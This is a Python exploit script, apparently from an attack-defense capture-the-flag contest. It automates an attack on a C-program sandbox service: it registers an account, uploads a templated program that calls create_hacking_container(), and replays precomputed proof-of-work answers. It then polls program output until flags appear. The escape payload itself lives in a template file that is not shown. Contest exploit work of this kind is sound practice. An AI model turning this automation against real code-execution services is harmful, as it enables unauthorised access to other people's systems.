import json
import logging
import pathlib
import pprint
import random
import re
import string
import sys
import time
from typing import Tuple

import requests
import requests.auth

from proof_of_work import challenge_responses


flag_re = re.compile("[A-Z0-9]{31}=")


class HttpExploit:
    def __init__(self, base_address: str):
        super().__init__()
        self.base_address = base_address
        self._session = requests.Session()

    def try_http_get(self, url, *args, **kwargs):
        response = self._session.get(self.base_address + url, *args, **kwargs)
        return self._parse_json(response)

    def try_http_post(self, url, *args, **kwargs):
        response = self._session.post(self.base_address + url, *args, **kwargs)
        return self._parse_json(response)

    def _parse_json(self, response: requests.Response):
        try:
            result = response.json()
            logging.debug('Parsed JSON response: %s' % pprint.pformat(result))
        except json.JSONDecodeError as e:
            logging.error("Invalid JSON in response on %s: %s", response.url, str(e), exc_info=e)
            return

        self.check_json_response(result, response.url)

        return result

    def check_json_response(self, response: dict, url: str):
        pass


class BearerAuth(requests.auth.AuthBase):
    def __init__(self, token):
        self.token = token

    def __call__(self, r):
        r.headers["Authorization"] = "Bearer " + self.token
        return r


class SandboxExploit(HttpExploit):
    def __init__(self, address):
        super().__init__(f"http://{address}:8000")

    def hack(self):
        username = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        password = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        self._register_user(username, password)
        self._login(username, password)

        create_hacking_container_code = self._generate_program_code("create_hacking_container()")

        program_id = self._upload_program(create_hacking_container_code)
        challenge_id, challenge_prefix = self._get_proof_of_work_challenge(program_id)
        challenge_response = challenge_responses[challenge_prefix]
        output = self._run_program(program_id, "", challenge_id, challenge_response)

        container_id = output.strip().split("\n")[-1].strip()
        logging.info(f"Found container id: {container_id}")

        self.wait_for_flags(container_id)

    def wait_for_flags(self, container_id: str):
        get_hacking_container_output_code = self._generate_program_code(f"get_hacking_container_output(\"{container_id}\")")
        program_id = self._upload_program(get_hacking_container_output_code)

        output = ''
        while not re.findall(flag_re, output):
            challenge_id, challenge_prefix = self._get_proof_of_work_challenge(program_id)
            challenge_response = challenge_responses[challenge_prefix]
            output = self._run_program(program_id, "", challenge_id, challenge_response)

            logging.info("Waiting for flags... Sleep for 5 second")
            time.sleep(5)

        print("Found flags!")
        print(re.findall(flag_re, output))

    def _register_user(self, username: str, password: str) -> int:
        logging.info('Try to register a user %r with password %r' % (username, password))
        r = self.try_http_post("/users", json={
            "username": username,
            "password": password,
        })

        user_id = int(r['user']['id'])
        logging.info('Success. User id is %d' % (user_id, ))
        return user_id

    def _login(self, username: str, password: str):
        logging.info('Try to login as "%s" with password "%s"' % (username, password))
        r = self.try_http_post("/login", data={
            "username": username,
            "password": password,
        })

        access_token = r.get("access_token", None)
        self._session.auth = BearerAuth(access_token)

    def _generate_program_code(self, function_call: str) -> str:
        template = (pathlib.Path(__file__).parent / "program_template.c").read_text()
        return template.replace("// CODE //", function_call + ";")

    def _upload_program(self, program_code: str) -> int:
        logging.info('Try to upload a program')
        r = self.try_http_post("/programs", json={
            "code": program_code,
        })

        program_id = int(r["program"]["id"])

        logging.info("Success. Program id is %d" % (program_id, ))
        return program_id

    def _run_program(self, program_id: int, stdin: str, challenge_id: int, challenge_response: str):
        logging.info('Try to run a program %d with stdin %r' % (program_id, stdin))
        r = self.try_http_post("/programs/%d/run" % (program_id, ), json={
            "input": stdin,
            "challenge_id": challenge_id,
            "challenge_response": challenge_response,
        })

        return r["output"]

    def _get_proof_of_work_challenge(self, program_id: int) -> Tuple[int, str]:
        r = self.try_http_post("/programs/%d/challenge" % (program_id, ))
        return r["challenge_id"], r["prefix"]


if __name__ == "__main__":
    if len(sys.argv) <= 1:
        print(f"Usage: {sys.argv[0]} <IP-ADDRESS>")
        sys.exit(1)

    logging.basicConfig(format="%(asctime)-15s [%(levelname)s] %(message)s", level=logging.DEBUG)

    ip_address = sys.argv[1]
    SandboxExploit(ip_address).hack()